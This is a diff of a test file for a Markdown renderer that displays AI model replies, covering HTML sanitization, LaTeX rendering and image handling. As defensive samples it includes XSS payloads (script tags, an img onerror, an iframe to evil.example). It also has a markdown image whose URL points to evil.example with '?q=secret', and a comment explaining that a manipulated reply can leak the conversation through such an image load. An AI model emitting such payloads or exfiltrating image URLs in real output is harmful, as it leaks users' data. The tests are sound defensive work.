@@ -63,10 +63,68 @@ describe('Markdown (model replies)', () => {
     expect(html).toContain('x := 1')
   })
 
-  it('never renders raw HTML from a reply', () => {
-    const html = md('Hello <script>alert(1)</script> <b>there</b>')
+  // Safe HTML is kept (GitHub's allow-list); dangerous HTML is removed, not shown.
+  it('renders safe HTML tags', () => {
+    const html = md('Hello <b>there</b>, x<sup>2</sup>, H<sub>2</sub>O, press <kbd>Ctrl</kbd>.')
+    expect(html).toContain('<b>there</b>')
+    expect(html).toContain('<sup>2</sup>')
+    expect(html).toContain('<sub>2</sub>')
+    expect(html).toContain('<kbd>Ctrl</kbd>')
+    expect(html).not.toContain('&lt;')
+  })
+
+  it('removes dangerous HTML entirely, never runs or shows it', () => {
+    const html = md('Hi <script>alert(1)</script><style>body{}</style><img src="x" onerror="alert(2)"><iframe src="https://evil.example"></iframe> end')
     expect(html).not.toContain('<script')
-    expect(html).not.toContain('<b>')
+    expect(html).not.toContain('alert(1)')
+    expect(html).not.toContain('<style')
+    expect(html).not.toContain('onerror')
+    expect(html).not.toContain('<iframe')
+    expect(html).toContain('end')
+  })
+
+  // An image loads its URL the moment a reply is shown. A manipulated reply
+  // can put the conversation into that URL and send it to a stranger's
+  // server — so a reply never loads an image; it offers a link instead.
+  it('never loads an image from a reply; a web image becomes a link', () => {
+    const html = md('![sales chart](https://evil.example/p.png?q=secret) and <img src="https://evil.example/x.png" alt="pixel"> and <img src="x">')
+    expect(html).not.toContain('<img')
+    expect(html).toMatch(/<a href="https:\/\/evil\.example\/p\.png\?q=secret" target="_blank" rel="noopener noreferrer">image: sales chart<\/a>/)
+    expect(html).toContain('image: pixel')
+  })
+
+  // The reply the user reported: <br> and $\bullet$ leaked as raw text.
+  it('renders <br> and LaTeX bullets inside a table cell', () => {
+    const html = md('| Risk | Control |\n|---|---|\n| Supply | $\\bullet$ Integration.<br>$\\bullet$ Ultramodern houses. |')
+    expect(html).toMatch(/<td>.*<br\/>.*<\/td>/)
+    expect(html).toContain('class="katex"')
+    expect(html).not.toContain('&lt;br&gt;')
+    expect(html).not.toContain('$')
+  })
+
+  it('renders inline and display LaTeX in every delimiter form', () => {
+    const html = md('Inline $E = mc^2$ and \\(a^2\\).\n\n\\[x = \\sqrt{2}\\]\n\n$$\n\\sum_{i=1}^n i\n$$')
+    expect(html.match(/class="katex"/g)?.length).toBe(4)
+    expect(html.match(/class="katex-display"/g)?.length).toBe(2)
+    expect(html).not.toContain('$')
+  })
+
+  it('leaves money as text', () => {
+    const html = md('It costs $5 and $10 a month.')
+    expect(html).toContain('It costs $5 and $10 a month.')
+    expect(html).not.toContain('katex')
+  })
+
+  it('never reads $ inside code as math', () => {
+    const html = md('Run `echo $HOME$` and:\n\n```bash\nexport A=$x$\n```')
+    expect(html).not.toContain('katex')
+    expect(html).toContain('$HOME$')
+  })
+
+  it('shows broken LaTeX as its source instead of failing', () => {
+    const html = md('Bad $\\notacommand{x}$ here.')
+    expect(html).toContain('notacommand')
+    expect(html).toContain('here.')
   })
 
   it('drops a javascript: link target', () => {
@@ -94,5 +152,17 @@ describe('InlineText (stored sentences)', () => {
 
   it('drops a heading marker at the start of a sentence', () => {
     expect(inline('### Why Postgres wins')).toBe('Why Postgres wins')
+  })
+
+  it('renders inline LaTeX in a sentence, keeping the words around it', () => {
+    const html = inline('$\\bullet$ Integration with **Poultry Max**.')
+    expect(html).toContain('class="katex"')
+    expect(html).toContain('<strong>Poultry Max</strong>')
+    expect(html).toContain(' Integration with ')
+    expect(html).not.toContain('$')
+  })
+
+  it('leaves money in a sentence as text', () => {
+    expect(inline('It costs $5 and $10.')).toBe('It costs $5 and $10.')
   })
 })
